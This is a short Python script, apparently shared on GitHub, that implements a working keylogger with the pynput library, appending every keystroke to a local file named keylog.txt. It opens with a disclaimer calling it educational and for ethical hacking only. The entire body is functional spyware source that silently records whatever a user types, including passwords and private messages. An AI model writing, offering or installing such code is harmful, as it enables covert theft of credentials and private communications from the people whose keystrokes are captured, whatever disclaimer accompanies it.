"""
⚠️ DISCLAIMER:
This keylogger is created for educational purposes and ethical hacking only.
Do NOT use this on unauthorized systems. Unauthorized use is illegal and punishable by law.

Author: Keshav Goyal
GitHub: https://github.com/keshavcybersec
"""

from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
